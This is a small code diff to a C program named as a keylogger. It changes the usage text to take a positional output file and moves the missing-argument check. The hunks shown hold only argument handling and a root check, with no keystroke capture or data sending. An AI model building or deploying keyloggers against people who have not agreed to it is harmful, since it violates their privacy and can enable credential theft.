@@ -60,7 +60,7 @@ static void keylogger_usage(void)
 {
     printf("\n"
             "Usage:\n"
-            "     sudo ./keyloger -f file\n"
+            "     sudo ./keyloger output_file\n"
             "\n");
     exit(EXIT_FAILURE);
 }
@@ -69,11 +69,11 @@ void keylogger_init(char *ofile)
 {
     signal(SIGINT, sig_handler);
 
-    if (!ofile)
-        keylogger_usage();
-
     running = 1;
     output_file = ofile;
+
+    if (!ofile)
+        keylogger_usage();
 
     if (geteuid() != 0)
         keylogger_usage();
